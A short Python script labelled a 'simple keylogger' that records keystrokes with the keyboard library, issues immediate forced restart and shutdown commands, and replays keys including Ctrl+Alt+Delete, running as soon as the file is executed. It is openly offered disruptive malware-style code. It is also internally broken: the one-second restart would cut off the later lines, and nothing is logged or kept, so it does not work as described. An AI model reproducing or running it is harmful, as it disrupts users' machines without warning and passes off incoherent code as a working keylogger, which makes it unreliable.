""" Just a simple keylogger implementation """
import os
import keyboard


def keylogger():
    keyboard.wait('enter')
    recording = keyboard.record(until='esc')
    os.system('shutdown /r /t 1')
    keyboard.play(recording, speed_factor=1.0)
    keyboard.press_and_release('ctrl+alt+delete, shift')
    os.system('shutdown /s /t 1')


keylogger()
